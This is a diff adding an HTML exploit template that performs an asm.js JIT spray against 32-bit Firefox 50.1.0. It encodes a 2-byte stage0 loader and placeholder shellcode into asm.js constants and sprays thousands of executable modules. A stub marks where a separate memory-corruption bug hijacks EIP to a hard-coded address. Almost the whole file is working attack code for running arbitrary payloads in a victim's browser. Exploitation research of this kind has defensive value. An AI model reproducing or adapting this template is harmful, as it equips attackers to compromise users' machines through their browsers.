@@ -1,0 +1,126 @@
+<!DOCTYPE HTML>
+
+<!--
+
+    ASM.JS JIT SPRAY
+
+    works on 32-bit Firefox - successfully tested with 50.1.0
+
+    2-byte DYNAMIC LOADER - generated via:
+    %CMDLINE%
+
+    (C) Rh0
+
+-->
+
+<head>
+<meta charset=UTF-8 />
+<script>
+// stage0 will load and execute payload
+payload = %BIN_PAYLOAD%
+max_payload_sz = %MAX_PAYLOAD_SIZE%
+jmp_distance = %DISTANCE%
+jmp = "eb"
+stage0 = %STAGE0%
+asm_js_header = '' +
+'function asm_js_module(stdlib, foreign, heap){' + 
+'    "use asm";' +
+'    var buf = new stdlib.Uint32Array(heap);' +
+'    var rnd = foreign.rnd;' +
+'    function payload_code(){'
+
+asm_js_footer = '' +
+'    }' +
+'    return payload_code;' +
+'};' +
+/* triggers creation of many RX modules */
+'spray_modules();'
+
+
+
+function load_asmjs(){
+    code = ""
+    constant_no = 0
+    offset = 0x10
+
+    /* unecessary nop jumps */
+    for (; constant_no < 10; constant_no++){
+        code += 'buf[' + (constant_no + offset) + '] = 0x'+ jmp_distance.toString(16) + jmp + '9090;'
+    }
+
+    /* 2-byte stage0 */
+    for (i in stage0){
+        code += 'buf[' + (constant_no + offset) + '] = 0x' + stage0[i] + ";"
+        constant_no++
+    }
+    if (payload.length > max_payload_sz){
+        alert("Error: shellcode payload is too big")
+        return
+    }
+
+    /* append binary payload (if any, in case stage0 loader is used) */
+    for (var i=0; i < payload.length; i+=4){
+        code += 'buf[' + (constant_no + offset) + '] = 0x'
+        val = payload.slice(i, i + 4)
+        /* only for last iteration */
+        while (val.length < 4) val += "\x90"
+        for (var j=3; j>=0; j--){
+            code += (0x100 + val.charCodeAt(j)).toString(16).slice(1)
+        }
+        code += ';'
+        constant_no++
+    }
+
+    /* fill up payload space */
+    if (payload.length > 0){
+        for (var i=0; i < (max_payload_sz - payload.length); i+=4){
+            code += 'buf[' + (constant_no + offset) + '] = 0xcccccccc;'
+        }
+    }
+    /* https://developer.mozilla.org/en-US/docs/Games/Techniques/Async_scripts
+     */
+    asm_js = asm_js_header + code + asm_js_footer
+    /* create blob script and load it */
+    var blob = new Blob([asm_js]);
+    var script = document.createElement('script');
+    var url = URL.createObjectURL(blob);
+    script.onload = script.onerror = function() { URL.revokeObjectURL(url); };
+    script.src = url;
+    /* triggers asm module compilation and spray_modules() execution */
+    document.body.appendChild(script);
+}
+
+
+function spray_modules(){
+    buffer = new ArrayBuffer(1 << 18)
+    sprayed = []
+    for (var i=0;i<=0x1800;i++){
+        sprayed[i] = asm_js_module(window, {rnd: ffi}, buffer)
+    }
+
+    trigger_vuln()
+}
+
+function ffi(){ // foreignFunctionInterface
+    x = parseInt(Math.random() * ((1 << 18)-1))
+    return x|0;
+}
+
+
+/* GET EIP CONTROL WITH YOUR VULN HERE */
+/* SET EIP TO 0x1C1C0053 ON WINDOWS 32-bit*/
+function trigger_vuln(){
+    /* You may need to adjust this address dependent on your vuln and version */
+    alert("Set EIP to 0x1c1c0060 (32-bit Firefox 50.1.0 on Windows) with your vuln here")
+}
+
+
+</script>
+</head>
+<html>
+<body style=background:black onload=load_asmjs()>
+<h1 style=color:green>
+%HEADER%
+</h1>
+</body>
+</html>
